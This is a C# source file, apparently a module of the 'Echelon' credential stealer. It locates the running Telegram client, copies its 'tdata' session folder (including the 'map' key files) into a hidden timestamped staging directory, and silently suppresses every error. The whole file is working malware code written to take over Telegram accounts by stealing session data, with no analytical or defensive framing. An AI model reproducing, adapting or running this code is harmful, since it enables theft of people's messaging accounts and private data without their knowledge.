

using System;
using System.Diagnostics;
using System.IO;

namespace Echelon
{
    public class Telegram
    {
        public static int count;

        private static bool in_patch;

        public static void GetTelegram(string Echelon_Dir)
        {
           
            try
            {
                var prcName = "Telegram";
                var processByName = Process.GetProcessesByName(prcName);

                if (processByName.Length < 1)
                    return;
                

                    var dir_from = Path.GetDirectoryName(processByName[0].MainModule.FileName) + "\\tdata";
                if (!Directory.Exists(dir_from))
                    return;

                var dir_to = Echelon_Dir + "\\Telegram_" +
                            (int)(DateTime.UtcNow - new DateTime(1970, 1, 1)).TotalSeconds;
                CopyAll(dir_from, dir_to);
                count++;
               
            }
            catch  {}
        }

        private static void CopyAll(string fromDir, string toDir)
        {


            try
            {
                var di = Directory.CreateDirectory(toDir);
            di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            foreach (var s1 in Directory.GetFiles(fromDir))
                CopyFile(s1, toDir);
            
            foreach (var s in Directory.GetDirectories(fromDir))
                CopyDir(s, toDir);
        }
            catch  { }
         
        }

        private static void CopyFile(string s1, string toDir)
        {
            try
            {
                var fname = Path.GetFileName(s1);

                if (in_patch && !(fname[0] == 'm' || fname[1] == 'a' || fname[2] == 'p'))
                    return;

                var s2 = toDir + "\\" + fname;

                File.Copy(s1, s2);
                
            }
            catch  {  }
            
        }

        private static void CopyDir(string s, string toDir)
        {
            try
            {
                in_patch = true;
                CopyAll(s, toDir + "\\" + Path.GetFileName(s));
                in_patch = false;
                
            }
            catch  { }
        }
    }
    
}          
    